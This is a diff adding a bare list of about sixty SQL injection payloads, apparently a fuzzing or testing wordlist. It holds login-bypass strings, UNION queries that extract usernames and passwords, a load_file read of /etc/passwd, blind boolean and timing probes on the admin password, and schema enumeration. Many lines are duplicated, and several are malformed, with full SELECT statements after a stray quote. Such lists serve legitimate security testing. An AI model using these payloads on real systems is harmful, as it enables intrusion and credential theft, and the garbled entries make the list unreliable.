@@ -1,0 +1,61 @@
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /* 
+' OR '1'='1' AND 'x'='x --
+' OR '' = ''
+' OR 'x' = 'x'
+' AND 1=1 --
+' AND 1=2 --
+' UNION SELECT NULL, NULL --
+' UNION SELECT username, password FROM users --
+' UNION SELECT version(), database() --
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --
+' UNION SELECT null, username, password FROM users --
+' UNION SELECT load_file('/etc/passwd'), NULL --
+' UNION ALL SELECT NULL, username, password FROM users --
+' UNION SELECT @@version, NULL --
+' SELECT * FROM users WHERE username = '' OR ''1''=''1 --
+' SELECT * FROM products WHERE name = '' OR ''1''=''1 --
+' SELECT * FROM employees WHERE id = '' OR ''1''=''1 --
+' AND (SELECT COUNT(*) FROM users) > 0 --
+' AND (SELECT * FROM users WHERE username='admin') IS NOT NULL --
+' AND (SELECT * FROM users WHERE username='admin' AND password='password') IS NOT NULL --
+' AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 0 --
+' AND (SELECT SUBSTRING(@@version, 1, 1))='5' --
+' AND EXISTS(SELECT * FROM users) --
+' AND NOT EXISTS(SELECT * FROM users) --
+' OR (SELECT 1 FROM dual) --
+' SELECT IF(1=1, BENCHMARK(1000000, MD5(0)), 0) --
+' SELECT (CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN 1 ELSE 0 END) --
+' OR (SELECT COUNT(*) FROM users) > 0 --
+' AND (SELECT * FROM users WHERE username='admin') IS NOT NULL --
+' SELECT username FROM users WHERE username = '' OR ''1''=''1 --
+' SELECT password FROM users WHERE username = '' OR ''1''=''1 --
+' SELECT * FROM users WHERE id = '' OR ''1''=''1 --
+' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --
+' OR 1=1 LIMIT 1 OFFSET 0 --
+' OR 1=1 LIMIT 1 OFFSET 1 --
+' AND 'a'='a' UNION SELECT NULL, NULL --
+' SELECT username, password FROM users WHERE '1'='1' --
+' SELECT * FROM orders WHERE user_id = '' UNION SELECT NULL, NULL --
+' SELECT * FROM users WHERE id = '' UNION SELECT NULL, NULL --
+' SELECT (CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN 'true' ELSE 'false' END) --
+' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a' --
+' SELECT * FROM orders WHERE id = '' UNION SELECT NULL, NULL --
+' SELECT COUNT(*) FROM users WHERE username='admin' --
+' AND id IN (SELECT id FROM users WHERE username='admin') --
+' AND (SELECT COUNT(*) FROM users) > 0 --
+' AND '1'='2' UNION SELECT NULL, NULL --
+' UNION SELECT username, password FROM users WHERE '1'='1' --
+' SELECT * FROM products WHERE name = '' OR ''1''=''1' --
+' SELECT * FROM employees WHERE id = '' OR ''1''=''1 --
+' UNION SELECT NULL, username, password FROM users --
+' OR EXISTS(SELECT 1) --
+' OR (SELECT COUNT(*) FROM users) > 0 --
+' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --
+' SELECT * FROM users WHERE username = '' UNION SELECT NULL, NULL --
+' AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 0 --
+' SELECT password FROM users WHERE username = '' OR ''1''=''1 --
+' SELECT username FROM users WHERE password = '' OR ''1''=''1 --
+' SELECT * FROM users WHERE username = '' UNION SELECT NULL, NULL --
+' SELECT * FROM orders WHERE id = '' UNION SELECT NULL, NULL --
